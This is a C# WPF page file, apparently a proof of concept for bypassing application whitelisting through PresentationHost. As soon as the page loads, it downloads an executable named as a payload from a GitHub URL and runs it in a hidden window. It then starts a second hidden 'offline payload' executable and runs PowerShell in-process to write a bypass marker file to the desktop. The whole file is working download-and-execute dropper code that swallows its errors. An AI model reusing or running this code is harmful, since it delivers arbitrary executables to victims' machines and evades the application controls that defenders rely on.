using System.Net;
using System.Windows;
using System.Windows.Controls;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace powershell
{
    public partial class Page1 : Page
    {
        public Page1()
        {
            InitializeComponent();
            Execute();
        }
        private void Execute()
        {
            string remoteUri = "https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/PresentationHostBBypass/PresentationHostBOnlinePayload.exe";
            string fileName = "PresentationHostBOnlinePayloadDownloaded.exe", myStringWebResource = null;
            // Create a new WebClient instance.
            WebClient myWebClient = new WebClient();
            // Concatenate the domain with the Web resource filename.
            myStringWebResource = remoteUri + fileName;
            try {
                // Download the Web resource and save it into the current filesystem folder.
                myWebClient.DownloadFile(myStringWebResource, fileName);
                System.Diagnostics.Process process = new System.Diagnostics.Process();
            } catch {
            }
            System.Diagnostics.Process processA = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfoA = new System.Diagnostics.ProcessStartInfo();
            startInfoA.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfoA.FileName = "PresentationHostBOnlinePayloadDownloaded.exe";
            processA.StartInfo = startInfoA;
            try {
                processA.Start();
            } catch {
            }

            System.Diagnostics.Process processB = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfoB = new System.Diagnostics.ProcessStartInfo();
            startInfoB.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfoB.FileName = "PresentationHostBOfflinePayload.exe";
            processB.StartInfo = startInfoB;
            try
            {
                processB.Start();
            }
            catch
            {
            }

            string command = "$DesktopPath = [Environment]::GetFolderPath('Desktop');echo PresentationHostBypass >> $DesktopPath\\WLtester.txt;";
            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
            rspace.Open();
            Pipeline pipeline = rspace.CreatePipeline();
            pipeline.Commands.AddScript(command);
            pipeline.InvokeAsync();
        }
    }
}
